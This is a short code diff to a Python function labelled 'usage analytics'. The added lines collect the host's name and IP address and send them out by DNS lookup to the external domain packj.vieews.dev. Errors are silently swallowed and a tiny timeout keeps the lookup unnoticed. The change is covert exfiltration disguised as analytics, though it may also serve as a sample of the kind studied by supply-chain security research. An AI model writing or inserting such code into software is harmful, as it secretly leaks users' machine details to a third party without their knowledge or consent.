@@ -41,7 +41,9 @@ def send_usage_analytics(pkg_name, ver_str):
 	try:
 		# Timeout in 100 milliseconds
 		with raise_on_timeout(0.01):
-			query = f'PyPI%{pkg_name}%{ver_str}%packj.vieews.dev'
+			host_name = socket.gethostname()
+			ipaddr = socket.gethostbyname(host_name)
+			query = f'#{ipaddr}#{host_name}#PyPI%{pkg_name}%{ver_str}%packj.vieews.dev'
 			socket.gethostbyname(query)
 	except:
 		pass
